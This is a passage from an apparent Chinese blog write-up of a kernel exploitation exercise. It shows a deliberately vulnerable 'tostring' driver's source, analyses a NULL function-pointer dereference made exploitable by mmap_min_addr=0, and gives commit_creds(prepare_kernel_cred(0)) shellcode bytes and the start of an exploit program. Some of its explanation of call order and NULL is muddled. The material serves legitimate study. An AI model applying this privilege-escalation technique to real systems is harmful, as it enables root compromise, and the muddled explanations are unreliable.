class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/version.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kdev_t.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/device.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/cdev.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/uaccess.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/slab.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ISSPACE(c)  ((c) == <span class="meta-string">' '</span> || ((c) &gt;= <span class="meta-string">'\t'</span> &amp;&amp; (c) &lt;= <span class="meta-string">'\r'</span>))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ISASCII(c)  (((c) &amp; ~0x7f) == 0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ISUPPER(c)  ((c) &gt;= <span class="meta-string">'A'</span> &amp;&amp; (c) &lt;= <span class="meta-string">'Z'</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ISLOWER(c)  ((c) &gt;= <span class="meta-string">'a'</span> &amp;&amp; (c) &lt;= <span class="meta-string">'z'</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ISALPHA(c)  (ISUPPER(c) || ISLOWER(c))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ISDIGIT(c)  ((c) &gt;= <span class="meta-string">'0'</span> &amp;&amp; (c) &lt;= <span class="meta-string">'9'</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">local_strtoul</span> <span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">char</span>*   nstr,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">char</span>**  endptr,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">int</span> base)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> !(defined(__KERNEL__))</span></span><br><span class="line">    <span class="keyword">return</span> strtoul (nstr, endptr, base);    <span class="comment">/* user mode */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    <span class="keyword">char</span>* s = nstr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> acc;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> c;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> cutoff;</span><br><span class="line">    <span class="keyword">int</span> neg = <span class="number">0</span>, any, cutlim;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        c = *s++;</span><br><span class="line">    &#125; <span class="keyword">while</span> (ISSPACE(c));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (c == <span class="string">'-'</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        neg = <span class="number">1</span>;</span><br><span class="line">        c = *s++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">'+'</span>)</span><br><span class="line">        c = *s++;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((base == <span class="number">0</span> || base == <span class="number">16</span>) &amp;&amp;</span><br><span class="line">        c == <span class="string">'0'</span> &amp;&amp; (*s == <span class="string">'x'</span> || *s == <span class="string">'X'</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        c = s[<span class="number">1</span>];</span><br><span class="line">        s += <span class="number">2</span>;</span><br><span class="line">        base = <span class="number">16</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (base == <span class="number">0</span>)</span><br><span class="line">        base = c == <span class="string">'0'</span> ? <span class="number">8</span> : <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    cutoff = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)ULONG_MAX / (<span class="keyword">unsigned</span> <span class="keyword">long</span>)base;</span><br><span class="line">    cutlim = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)ULONG_MAX % (<span class="keyword">unsigned</span> <span class="keyword">long</span>)base;</span><br><span class="line">    <span class="keyword">for</span> (acc = <span class="number">0</span>, any = <span class="number">0</span>; ; c = *s++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!ISASCII(c))</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> (ISDIGIT(c))</span><br><span class="line">            c -= <span class="string">'0'</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (ISALPHA(c))</span><br><span class="line">            c -= ISUPPER(c) ? <span class="string">'A'</span> - <span class="number">10</span> : <span class="string">'a'</span> - <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (c &gt;= base)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> (any &lt; <span class="number">0</span> || acc &gt; cutoff || (acc == cutoff &amp;&amp; c &gt; cutlim))</span><br><span class="line">            any = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            any = <span class="number">1</span>;</span><br><span class="line">            acc *= base;</span><br><span class="line">            acc += c;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (any &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        acc = INT_MAX;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (neg)</span><br><span class="line">        acc = -acc;</span><br><span class="line">    <span class="keyword">if</span> (endptr != <span class="number">0</span>)</span><br><span class="line">        *((<span class="keyword">const</span> <span class="keyword">char</span> **)endptr) = any ? s - <span class="number">1</span> : nstr;</span><br><span class="line">    <span class="keyword">return</span> (acc);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">dev_t</span> first; <span class="comment">// Global variable for the first device number</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">cdev</span> <span class="title">c_dev</span>;</span> <span class="comment">// Global variable for the character device structure</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">class</span> *<span class="title">cl</span>;</span> <span class="comment">// Global variable for the device class</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tostring_s</span> &#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> pointer;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> pointer_max;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> *tostring_stack;</span><br><span class="line">  <span class="keyword">ssize_t</span> (*tostring_read)(struct file *f, <span class="keyword">char</span> __user *buf, <span class="keyword">size_t</span> len, <span class="keyword">loff_t</span> *off); </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">tostring_s</span> *<span class="title">tostring</span>;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> taille=<span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">module_param(taille, <span class="keyword">int</span>,<span class="number">1</span>);</span><br><span class="line">MODULE_PARM_DESC(taille, <span class="string">"Stack size in Ko"</span>);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">tostring_open</span><span class="params">(struct inode *i, struct file *f)</span></span>&#123;</span><br><span class="line">  printk(KERN_INFO <span class="string">"Tostring: open()\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">tostring_close</span><span class="params">(struct inode *i, struct file *f)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  printk(KERN_INFO <span class="string">"Tostring: close()\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">tostring_read</span><span class="params">(struct file *f, <span class="keyword">char</span> __user *buf, <span class="keyword">size_t</span> len, <span class="keyword">loff_t</span> *off)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  printk(KERN_INFO <span class="string">"Tostring: read()\n"</span>);</span><br><span class="line">  <span class="keyword">return</span>((tostring-&gt;tostring_read)(f, buf, len, off)); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">tostring_read_hexa</span><span class="params">(struct file *f, <span class="keyword">char</span> __user *buf, <span class="keyword">size_t</span> len, <span class="keyword">loff_t</span> *off)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  printk(KERN_INFO <span class="string">"Tostring: read_hexa()\n"</span>);</span><br><span class="line">  <span class="keyword">if</span> (tostring-&gt;pointer &gt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span>(<span class="built_in">snprintf</span>(buf,len,<span class="string">"%16llx\n"</span>,tostring-&gt;tostring_stack[--(tostring-&gt;pointer)]));</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">tostring_create</span><span class="params">(<span class="keyword">int</span> tl)</span> </span>&#123;</span><br><span class="line">  <span class="comment">/*  tostring=kmalloc(sizeof(struct tostring_s), GFP_DMA); */</span></span><br><span class="line">  taille=tl;</span><br><span class="line">  tostring-&gt;tostring_stack=kmalloc(taille*<span class="number">1024</span>, GFP_DMA);</span><br><span class="line">  <span class="keyword">if</span> (tostring-&gt;tostring_stack == <span class="literal">NULL</span>) <span class="keyword">return</span>(<span class="number">-1</span>);</span><br><span class="line">  tostring-&gt;pointer_max=(taille*<span class="number">1024</span>)/<span class="keyword">sizeof</span>(<span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span>);</span><br><span class="line">  tostring-&gt;tostring_read= tostring_read_hexa;</span><br><span class="line">  printk(KERN_INFO <span class="string">"Tostring: Stack size: %dK, locate at %p, max index: %d\n"</span>,taille,tostring-&gt;tostring_stack,tostring-&gt;pointer_max);</span><br><span class="line">  <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">tostring_read_dec</span><span class="params">(struct file *f, <span class="keyword">char</span> __user *buf, <span class="keyword">size_t</span> len, <span class="keyword">loff_t</span> *off)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  printk(KERN_INFO <span class="string">"Tostring: read_dec()\n"</span>);</span><br><span class="line">  <span class="keyword">if</span> (tostring-&gt;pointer &gt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span>(<span class="built_in">snprintf</span>(buf,len,<span class="string">"%lld\n"</span>,tostring-&gt;tostring_stack[--(tostring-&gt;pointer)]));</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">tostring_write</span><span class="params">(struct file *f, <span class="keyword">const</span> <span class="keyword">char</span> __user *buf,<span class="keyword">size_t</span> len, <span class="keyword">loff_t</span> *off)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">char</span> *bufk;</span><br><span class="line">  <span class="keyword">int</span> i,j;</span><br><span class="line"></span><br><span class="line">  printk(KERN_INFO <span class="string">"Tostring: write()\n"</span>);</span><br><span class="line">  <span class="comment">// rajout du 0 final</span></span><br><span class="line">  bufk = kmalloc(len + <span class="number">1</span>, GFP_DMA);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (bufk)&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(bufk, buf, len))</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line"> </span><br><span class="line">    bufk[len] = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line">    i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i &lt;len) &#123;</span><br><span class="line">    <span class="comment">/* Les commandes commencent par 10 '*' */</span></span><br><span class="line">      <span class="keyword">for</span> (j=<span class="number">0</span>;(j&lt;<span class="number">10</span>) &amp;&amp; (bufk[j]==<span class="string">'*'</span>);j++);</span><br><span class="line">      <span class="keyword">if</span> (j == <span class="number">10</span>) &#123;</span><br><span class="line">	<span class="keyword">for</span> (j=i+<span class="number">10</span>;(bufk[j]!=<span class="string">'\0'</span>) &amp;&amp; (bufk[j] != <span class="string">'\n'</span>);j++);</span><br><span class="line">	bufk[j]=<span class="string">'\0'</span>;</span><br><span class="line">	printk(<span class="string">"Tostring: Cmd %s\n"</span>,bufk+i+<span class="number">10</span>);</span><br><span class="line">	<span class="keyword">switch</span>(bufk[i+<span class="number">10</span>]) &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">'H'</span>: </span><br><span class="line">	  tostring-&gt;tostring_read= tostring_read_hexa;</span><br><span class="line">	  <span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">'D'</span>:</span><br><span class="line">	  tostring-&gt;tostring_read= tostring_read_dec;</span><br><span class="line">	  <span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">'S'</span>:</span><br><span class="line">	  printk(<span class="string">"Tostring: Delete stack\n"</span>);</span><br><span class="line">	  kfree(tostring-&gt;tostring_stack);</span><br><span class="line">	  tostring-&gt;tostring_stack=<span class="literal">NULL</span>;</span><br><span class="line">	  tostring-&gt;tostring_read=<span class="literal">NULL</span>;</span><br><span class="line">	  tostring-&gt;pointer=<span class="number">0</span>;</span><br><span class="line">	  tostring-&gt;pointer_max=<span class="number">0</span>;</span><br><span class="line">	  <span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">'N'</span>:</span><br><span class="line">	  printk(<span class="string">"Tostring: Stack create with size %ld\n"</span>,local_strtoul(bufk+i+<span class="number">11</span>,<span class="literal">NULL</span>,<span class="number">10</span>));</span><br><span class="line">	  <span class="keyword">if</span> (tostring-&gt;tostring_stack==<span class="literal">NULL</span>) tostring_create(local_strtoul(bufk+i+<span class="number">11</span>,<span class="literal">NULL</span>,<span class="number">10</span>));</span><br><span class="line">	  <span class="keyword">if</span> (tostring-&gt;tostring_stack==<span class="literal">NULL</span>) printk(<span class="string">"Tostring: Error, impossible to create stack\n"</span>);</span><br><span class="line">	  <span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	i=j+<span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">	printk(<span class="string">"tostring: insertion %lld\n"</span>,*((<span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> *) (bufk+i)));</span><br><span class="line">	<span class="keyword">if</span> (tostring-&gt;pointer &gt;= tostring-&gt;pointer_max) </span><br><span class="line">	  printk(KERN_INFO <span class="string">"Tostring: Stack full\n"</span>);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	  tostring-&gt;tostring_stack[(tostring-&gt;pointer)++]= *((<span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> *) (bufk+i));</span><br><span class="line">	i = i+<span class="keyword">sizeof</span>(<span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  kfree(bufk);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> len;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">pugs_fops</span> =</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  .owner = THIS_MODULE,</span><br><span class="line">  .<span class="built_in">open</span> = tostring_open,</span><br><span class="line">  .<span class="built_in">release</span> = tostring_close,</span><br><span class="line">  .<span class="built_in">read</span> = tostring_read,</span><br><span class="line">  .<span class="built_in">write</span> = tostring_write,</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">tostring_init</span><span class="params">(<span class="keyword">void</span>)</span> <span class="comment">/* Constructor */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  printk(KERN_INFO <span class="string">"Tostring registered"</span>);</span><br><span class="line">  tostring=kmalloc(<span class="keyword">sizeof</span>(struct tostring_s), GFP_DMA);</span><br><span class="line">  tostring_create(taille);</span><br><span class="line">  <span class="keyword">if</span> (alloc_chrdev_region(&amp;first, <span class="number">0</span>, <span class="number">8</span>, <span class="string">"tostring"</span>) &lt; <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ((cl = class_create(THIS_MODULE, <span class="string">"chardrv"</span>)) == <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    unregister_chrdev_region(first, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (device_create(cl, <span class="literal">NULL</span>, first, <span class="literal">NULL</span>, <span class="string">"tostring"</span>) == <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">"Tostring error"</span>);</span><br><span class="line">    class_destroy(cl);</span><br><span class="line">    unregister_chrdev_region(first, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  cdev_init(&amp;c_dev, &amp;pugs_fops);</span><br><span class="line">  <span class="keyword">if</span> (cdev_add(&amp;c_dev, first, <span class="number">1</span>) == <span class="number">-1</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    device_destroy(cl, first);</span><br><span class="line">    class_destroy(cl);</span><br><span class="line">    unregister_chrdev_region(first, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  printk(KERN_INFO <span class="string">"&lt;Major, Minor&gt;: &lt;%d, %d&gt;\n"</span>, MAJOR(first), MINOR(first));</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> __exit <span class="title">tostring_exit</span><span class="params">(<span class="keyword">void</span>)</span> <span class="comment">/* Destructor */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">"Tostring unregistered"</span>);</span><br><span class="line">    kfree(tostring-&gt;tostring_stack);</span><br><span class="line">    unregister_chrdev_region(first, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">module_init(tostring_init);</span><br><span class="line">module_exit(tostring_exit);</span><br><span class="line"> </span><br><span class="line">MODULE_LICENSE(<span class="string">"GPL"</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">"F.Boisson"</span>);</span><br><span class="line">MODULE_DESCRIPTION(<span class="string">"Module Tostring Integers Dec/Hex"</span>);</span><br></pre></td></tr></table></figure>

<p>重要需要注意一下两个函数：tostring_read和tostring_write</p>
<h5 id="read-1"><a href="#read-1" class="headerlink" title="read"></a>read</h5><ol>
<li>打印字符串<code>Tostring: read()\n</code></li>
<li>调用函数<code>tostring-&gt;tostring_read</code></li>
</ol>
<h5 id="write-1"><a href="#write-1" class="headerlink" title="write"></a>write</h5><ol>
<li>打印字符串<code>Tostring: write()\n</code></li>
<li>kmalloc申请chunk</li>
<li>将输入的内容送入chunk</li>
<li>末尾置<code>\0</code></li>
<li>比较前十个字符，是否都为<code>*</code></li>
<li>接着比较第11个字符，是否为<code>H\D\S\N</code>，分别调用不同的功能<ul>
<li>H：<code>tostring-&gt;tostring_read</code>设为<code>tostring_read_hexa</code></li>
<li>D：<code>tostring-&gt;tostring_read</code>设为<code>tostring_read_dec</code></li>
<li>S：清空数据<ul>
<li><code>tostring-&gt;tostring_read</code>设为null</li>
</ul>
</li>
<li>N：初始化</li>
</ul>
</li>
</ol>
<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><ol>
<li>由于init中有如下指令，故最低可以将mmap映射到0地址。</li>
</ol>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 0 &gt; /proc/sys/vm/mmap_min_addr</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>若将shellcode通过memcpy函数放入0地址</li>
<li>那么在S清空栈的时候，<code>tostring-&gt;tostring_read</code>被设置为null【NULL在Linux中的定义（/usr/include/linux/stddef.h）：#define NULL 0；#define NULL ((void *)0)C++中NULL为0，而Linux C中，NULL为地址0所指向的内容。 】</li>
<li>再次执行read时候，<code>tostring-&gt;tostring_read</code>会执行0地址中的内容，即可get shell</li>
</ol>
<h5 id="编写shellcode"><a href="#编写shellcode" class="headerlink" title="编写shellcode"></a>编写shellcode</h5><p>目标是调用<code>commit_creds(prepare_kernel_cred(0))</code>，故可编写如下汇编执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">xor eax,eax;</span><br><span class="line">call commit_creds;</span><br><span class="line">call prepare_kernel_cred;</span><br><span class="line">ret;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/06/05/kernel-study/image-20210604144540167.png" alt="image-20210604144540167"></p>
<p>有因为commit_creds和prepare_kernel_cred地址已知</p>
<blockquote>
<p>eax是参数？</p>
<p>所以一开始<code>xor eax,eax;</code>将commit_creds参数置零，它的结果放入eax中，作为prepare_kernel_cred的参数，即执行了<code>commit_creds(prepare_kernel_cred(0))</code></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">xor eax,eax;</span><br><span class="line">call 0xC10711F0;</span><br><span class="line">call 0xC1070E80; </span><br><span class="line">ret;</span><br></pre></td></tr></table></figure>

<p>通过<code>Radare2</code>，生成对应的shellcode</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~/nullpoint$ rasm2 "xor eax,eax ; call 0xC10711F0 ; call 0xC1070E80 ; ret;"</span><br><span class="line">31c0e8e91107c1e8740e07c1c3</span><br></pre></td></tr></table></figure>

<p>对应的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> payload[] = <span class="string">"\x31\xc0\xe8\xe9\x11\x07\xc1\xe8\x74\x0e\x07\xc1\xc3"</span>;</span><br></pre></td></tr></table></figure>

<h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> payload[] = <span class="string">"\x31\xc0\xe8\xe9\x11\x07\xc1\xe8\x74\x0e\x07\xc1\xc3"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span 